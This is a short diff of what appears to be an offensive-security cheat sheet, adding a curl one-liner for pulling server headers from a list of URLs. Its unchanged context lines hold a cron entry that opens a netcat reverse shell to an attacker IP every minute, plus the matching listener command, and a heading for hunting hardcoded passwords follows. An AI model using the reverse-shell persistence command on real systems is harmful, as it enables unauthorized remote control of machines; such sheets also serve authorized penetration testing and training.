@@ -8,6 +8,14 @@ echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
 
 On the attack platform: ```nc -lvp 1234```
 
+## Find Server Strings from HTTP Responses:
+
+Finding server strings from a file of URLs
+
+```
+curl -s --head -K servers.txt | grep -i server
+```
+
 ## Search for Hardcoded Passwords:
 
 ```
